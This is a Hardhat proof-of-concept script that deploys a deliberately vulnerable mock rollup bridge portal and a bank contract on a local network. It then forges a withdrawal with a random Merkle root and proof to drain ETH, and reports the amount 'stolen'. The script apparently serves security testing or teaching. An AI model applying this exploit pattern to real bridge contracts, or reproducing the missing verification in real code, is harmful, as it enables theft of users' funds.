import { ethers } from "hardhat";

async function main() {
  console.log("> npx hardhat run scripts/exploit-missing-root-verification.js --network localhost");
  console.log("\nStarting Missing State Root Verification Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy L2 oracle mock (just a reference, not actually used in the exploit)
  const L2OracleMock = await ethers.getContractFactory("L2OracleMock");
  const l2Oracle = await L2OracleMock.deploy();
  await l2Oracle.deployed();
  console.log(`L2OracleMock deployed at: ${l2Oracle.address}`);
  
  // Deploy vulnerable portal contract
  const VulnerablePortal = await ethers.getContractFactory("VulnerableOptimismPortal");
  const portal = await VulnerablePortal.deploy(l2Oracle.address);
  await portal.deployed();
  console.log(`VulnerableOptimismPortal deployed at: ${portal.address}`);
  
  // Deploy a simple bank contract that will be the target of the fraudulent withdrawal
  const TargetBank = await ethers.getContractFactory("SimpleBank");
  const bank = await TargetBank.deploy();
  await bank.deployed();
  console.log(`SimpleBank deployed at: ${bank.address}`);
  
  // Setup initial conditions
  const [owner, user1, attacker] = await ethers.getSigners();
  
  // Fund the bank
  await owner.sendTransaction({
    to: bank.address,
    value: ethers.utils.parseEther("50")
  });
  console.log(`Bank funded with 50 ETH`);
  
  // Check initial balances
  const initialBankBalance = await ethers.provider.getBalance(bank.address);
  const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(`Initial bank balance: ${ethers.utils.formatEther(initialBankBalance)} ETH`);
  console.log(`Initial attacker balance: ${ethers.utils.formatEther(initialAttackerBalance)} ETH`);
  
  // Fund the portal for withdrawal execution
  await owner.sendTransaction({
    to: portal.address,
    value: ethers.utils.parseEther("50")
  });
  console.log(`Portal funded with 50 ETH for withdrawals`);
  
  // Execute the attack
  console.log("\nExecuting the missing state root verification attack...");
  
  // Create a fraudulent withdrawal transaction that transfers funds from the bank
  const withdrawalAmount = ethers.utils.parseEther("25");
  const fraudulentWithdrawal = {
    target: bank.address,
    value: 0, // No ETH directly transferred by the portal
    nonce: 1337, // Any nonce works as there's no real verification
    data: bank.interface.encodeFunctionData("withdraw", [attacker.address, withdrawalAmount])
  };
  
  // Step 1: Prove the withdrawal without any real proof
  console.log("Proving fraudulent withdrawal...");
  const fakeMerkleRoot = ethers.utils.hexlify(ethers.utils.randomBytes(32));
  const fakeProof = ethers.utils.hexlify(ethers.utils.randomBytes(1024));
  
  const proveTx = await portal.connect(attacker).proveWithdrawalTransaction(
    fraudulentWithdrawal,
    fakeMerkleRoot,
    fakeProof
  );
  await proveTx.wait();
  
  // Step 2: Finalize the fraudulent withdrawal
  console.log("Finalizing fraudulent withdrawal...");
  const finalizeTx = await portal.connect(attacker).finalizeWithdrawalTransaction(
    fraudulentWithdrawal
  );
  await finalizeTx.wait();
  
  // Check final balances
  const finalBankBalance = await ethers.provider.getBalance(bank.address);
  const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  // Adjust for gas costs by just looking at bank balance changes
  console.log(`Final bank balance: ${ethers.utils.formatEther(finalBankBalance)} ETH`);
  console.log(`Final attacker balance (minus gas costs): ~${ethers.utils.formatEther(finalAttackerBalance)} ETH`);
  
  const stolenAmount = initialBankBalance.sub(finalBankBalance);
  console.log(`Amount stolen from bank: ${ethers.utils.formatEther(stolenAmount)} ETH`);
  
  // Verify the attack was successful
  if (stolenAmount.gt(ethers.utils.parseEther("0"))) {
    console.log("\n✅ ATTACK SUCCESSFUL: Funds withdrawn without valid state root verification");
  } else {
    console.log("\n❌ ATTACK FAILED: Could not exploit missing state root verification");
  }
}

// Ensure this can be called directly as well as imported
if (require.main === module) {
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
}

export default main;
